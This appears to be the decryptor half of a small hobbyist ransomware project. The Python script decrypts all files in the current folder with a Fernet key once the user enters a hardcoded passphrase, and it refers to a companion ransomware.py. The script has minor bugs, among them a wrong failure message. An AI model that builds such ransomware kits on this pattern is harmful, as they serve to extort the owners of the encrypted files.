#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Find some files

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "unlock.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("unlock.key", "rb") as key:
    secretkey = key.read()

secretphrase = "skrypt"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as files:
            contents = files.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as files:
            files.write(contents_decrypted)
        print("Your files are decrypted!!")
else:
        print("Sorry wrong phrase, your files are still decrypted...")
